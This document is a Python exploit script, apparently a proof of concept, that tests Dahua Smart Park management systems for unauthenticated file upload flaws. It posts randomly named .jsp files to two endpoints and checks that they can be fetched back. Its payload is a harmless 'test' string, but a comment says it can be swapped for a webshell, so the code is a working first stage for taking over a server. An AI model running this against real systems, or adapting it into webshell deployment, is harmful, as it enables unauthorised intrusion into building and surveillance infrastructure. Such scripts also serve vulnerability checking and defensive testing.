import argparse
import requests
import urllib3
import random
import string
import urllib.parse



urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def generate_random_string(length):  # 生成随机字符串
    letters = string.ascii_letters + string.digits
    random_string = ''.join(random.choice(letters) for _ in range(length))
    return random_string

def url_proces(url): #操作url
    # 添加http、https前缀
    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'http://' + url
    # 删除url路径部分
    url_path = url.split('/')
    uri = '/'.join(url_path[:3])
    # 去掉url末尾的斜杆
    if uri.endswith('/'):
        uri = uri[:-1]
    return uri

rBoundary=generate_random_string(16)
rFilename=generate_random_string(4)

headers={
    "User-Agent": "kuangxiaotu",
    "Content-Type": "multipart/form-data; boundary=" + rBoundary
}

point1 = "/publishing/publishing/material/file/video"
point2 = "/emap/devicePoint_addImgIco?hasSubsystem=true"

proxies={     # 设置代理，进行调试
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}


def banner(url):
    print('正在扫描大华智慧园区 文件上传漏洞')
    print('[+] Target        : ' + url)




def check1(url):
    data = (
        "--" + rBoundary + "\r\n"
        'Content-Disposition: form-data; name="Filedata"; filename='+ rFilename +'.jsp' +'\r\n'
        'Content-Type: application/octet-stream \r\n'
        'Content-Transfer-Encoding: binary \r\n'
        "\r\n"
        "test\r\n"  # 这里可以替换成马子
        "--" + rBoundary + "--"
    )
    r = requests.post(url + point1,data = data,headers=headers,verify=False,proxies=proxies)
    if r.status_code == 200 and "path" in r.text:
        r_data = r.json()
        global path1
        path1 = r_data['data']['path']
        r2=requests.get(url+'/publishingImg/'+path1,verify=False)
        if r2.status_code==200 and 'test' in r2.text:
            print('[+] /publishingImg/接口上传漏洞存在')
            print('[+] 文件路径 ' + url + '/publishingImg/' + path1)
            return True
    else:
        print("/publishingImg/接口上传漏洞不存在")


def check2(url): 
    data = (
        "--" + rBoundary + "\r\n"
        'Content-Disposition: form-data; name="upload"; filename='+ rFilename +'.jsp' +'\r\n'
        'Content-Type: application/octet-stream \r\n'
        'Content-Transfer-Encoding: binary \r\n'
        "\r\n"  
        "test\r\n"
        "--" + rBoundary + "--"
    )
    try:
        r = requests.post(url + point2,data = data,headers = headers,verify=False,proxies=None)
        if r.status_code == 200 and 'data' in r.text:
            r_data = r.json()
            global path2
            path2=r_data['data']
            parsed_url = urllib.parse.urlparse(url)
            host_without_port = parsed_url.netloc.split(":")[0]
            #protocol = parsed_url.scheme  # 获取协议部分
            modified_url = "http" + "://" + host_without_port
            r2 = requests.get(modified_url + ":8314" + "/upload/emap/society_new/" + path2, verify=False, allow_redirects=True,timeout=10,proxies=None)   # 上传文件路径的地方端口和原地址不同。原来是https,这个是http?
            if r2.status_code==200 and 'test' in r2.text:
                print('[+] /upload/emap/society_new/接口上传漏洞存在')
                print('[+] 文件路径 ' + url + '/upload/emap/society_new/' + path2)
                return True
            else:
                print("漏洞不存在")
    except:
        print("失败了，我也不知道为啥。")

def main():
    parser = argparse.ArgumentParser(description="大华智慧园区文件上传")
    parser.add_argument('-u', '--url', help='请输入url')
    args = parser.parse_args()
    url = url_proces(args.url)
    banner(url)
    check1(url)
    check2(url)
    
if __name__ == '__main__':
    main()
